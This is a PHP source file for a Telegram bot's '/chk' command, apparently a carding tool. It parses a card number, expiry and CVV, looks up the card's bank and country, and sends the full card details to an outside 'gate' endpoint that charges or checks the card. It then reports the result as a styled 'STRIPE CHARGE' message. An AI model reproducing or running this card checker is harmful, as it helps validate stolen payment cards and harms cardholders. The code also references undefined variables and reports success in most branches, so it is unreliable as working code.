<?php
include __DIR__."/../config/variables.php";
include __DIR__."/config/users.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/functions.php";


if ((strpos($message, "/chk") === 0)||(strpos($message, "!chk") === 0)||(strpos($message, ".chk") === 0)){
    

$message = substr($message, 5);
$messageidtoedit1 = bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"<b>CHECKING..🟥🟥</b>",
    'parse_mode'=>'html',
    'reply_to_message_id'=> $message_id
]);

$messageidtoedit = Getstr(json_encode($messageidtoedit1), '"message_id":', ',');

$cc = multiexplode(array(":", "/", " ", "|"), $message)[0];
$mes = multiexplode(array(":", "/", " ", "|"), $message)[1];
$ano = multiexplode(array(":", "/", " ", "|"), $message)[2];
$cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
$amt = '3';


if(empty($cc)||empty($cvv)||empty($mes)||empty($ano)){
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"Invalid details \nFormat -> cc|mm|yy|cvv",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    return;
};
if(strlen($ano) == '4'){
    $an = substr($ano, 2);
}
else{
  $an = $ano;
}
{
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"CHECKING..🟧🟧🟧",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
 }
    $amount = $amt * 100;
//------------Card info------------//
$lista = ''.$cc.'|'.$mes.'|'.$an.'|'.$cvv.'';
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        $fim = curl_exec($ch);
        $bank = GetStr($fim, '"bank":{"name":"', '"');
        $name = GetStr($fim, '"name":"', '"');
        $brand = GetStr($fim, '"brand":"', '"');
        $country = GetStr($fim, '"country":{"name":"', '"');
        $emoji = GetStr($fim, '"emoji":"', '"');
        $scheme = GetStr($fim, '"scheme":"', '"');
        $type = GetStr($fim, '"type":"', '"');
        if(strpos($fim, '"type":"credit"') !== false){
        $bin = 'Credit';
        }else{
        $bin = 'Debit';
        };
        {
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"CHECKING..🟨🟨🟨🟨🟨",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
      }
  $x++;
   $cc1 = file_get_contents('https://forbot.badboy117.repl.co/gate2.php?lista='.$lista);
   $msg1 = trim(strip_tags(getStr($cc1,' <br>Result:','</span><br>')));

   $r1 = "<b>CC : <code>$array[0]</code>%0AResult : $msg1%0A</b>";
   {
    bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"CHECKING..🟩🟩🟩🟩🟩🟩",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
      }
  ////////--[Responses]--////////

    if(strpos($result2, '"seller_message": "Payment complete."' )) {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"———»[𝐒𝐓𝐑𝐈𝐏𝐄 CHARGE]«———
𝐂𝐂 ⇾ <code>$lista</code>
𝐑𝐄𝐒𝐏𝐎𝐍𝙎𝐄 ⇾ CHARGE ✅
𝐆𝐀𝐓𝐄 ⇾ STRIPE CHARGE
———»Details«———
𝑩𝒂𝒏𝒌 ⇾ $bank
𝑻𝒚𝒑𝒆 ⇾ $bin
𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ⇾ $name $emoji
———»info«———
Proxy ⇾Live! ✅
 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 ➔ $user
 𝑩𝒐𝒕 𝑩𝒚 ➔ <a href='t.me/badboychx'> 𝑩𝑨𝑫𝑩𝑶𝒀 </a>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
    elseif(strpos($result2, "insufficient_funds" )) {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"———»[𝐒𝐓𝐑𝐈𝐏𝐄 CHARGE]«———
𝐂𝐂 ⇾ <code>$lista</code>
𝐑𝐄𝐒𝐏𝐎𝐍𝙎𝐄 ⇾ CHARGE ✅
𝐆𝐀𝐓𝐄 ⇾ STRIPE CHARGE
———»Details«———
𝑩𝒂𝒏𝒌 ⇾ $bank
𝑻𝒚𝒑𝒆 ⇾ $bin
𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ⇾ $name $emoji
———»info«———
Proxy ⇾Live! ✅
 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 ➔ $user
 𝑩𝒐𝒕 𝑩𝒚 ➔ <a href='t.me/badboychx'> 𝑩𝑨𝑫𝑩𝑶𝒀 </a>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
    elseif ((strpos($result1, "card_error_authentication_required")) || (strpos($result2, "card_error_authentication_required"))){
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"———»[𝐒𝐓𝐑𝐈𝐏𝐄 CHARGE]«———
𝐂𝐂 ⇾ <code>$lista</code>
𝐑𝐄𝐒𝐏𝐎𝐍𝙎𝐄 ⇾ CHARGE ✅
𝐆𝐀𝐓𝐄 ⇾ STRIPE CHARGE
———»Details«———
𝑩𝒂𝒏𝒌 ⇾ $bank
𝑻𝒚𝒑𝒆 ⇾ $bin
𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ⇾ $name $emoji
———»info«———
Proxy ⇾Live! ✅
 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 ➔ $user
 𝑩𝒐𝒕 𝑩𝒚 ➔ <a href='t.me/badboychx'> 𝑩𝑨𝑫𝑩𝑶𝒀 </a>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
    elseif(strpos($result2,'"cvc_check": "pass"')){
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"———»[𝐒𝐓𝐑𝐈𝐏𝐄 CHARGE]«———
𝐂𝐂 ⇾ <code>$lista</code>
𝐑𝐄𝐒𝐏𝐎𝐍𝙎𝐄 ⇾ CHARGE ✅
𝐆𝐀𝐓𝐄 ⇾ STRIPE CHARGE
———»Details«———
𝑩𝒂𝒏𝒌 ⇾ $bank
𝑻𝒚𝒑𝒆 ⇾ $bin
𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ⇾ $name $emoji
———»info«———
Proxy ⇾Live! ✅
 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 ➔ $user
 𝑩𝒐𝒕 𝑩𝒚 ➔ <a href='t.me/badboychx'> 𝑩𝑨𝑫𝑩𝑶𝒀 </a>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    }
    
    else {
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"———»[𝐒𝐓𝐑𝐈𝐏𝐄 CHARGE]«———
𝐂𝐂 ⇾ <code>$lista</code>
𝐑𝐄𝐒𝐏𝐎𝐍𝙎𝐄 ⇾ $msg1
𝐆𝐀𝐓𝐄 ⇾ STRIPE CHARGE
———»Details«———
𝑩𝒂𝒏𝒌 ⇾ $bank
𝑻𝒚𝒑𝒆 ⇾ $bin
𝑪𝒐𝒖𝒏𝒕𝒓𝒚 ⇾ $name $emoji
———»info«———
Proxy ⇾Live! ✅
 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚 ➔ $user
 𝑩𝒐𝒕 𝑩𝒚 ➔ <a href='t.me/badboychx'> 𝑩𝑨𝑫𝑩𝑶𝒀 </a>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            ]);
    };
}

?>
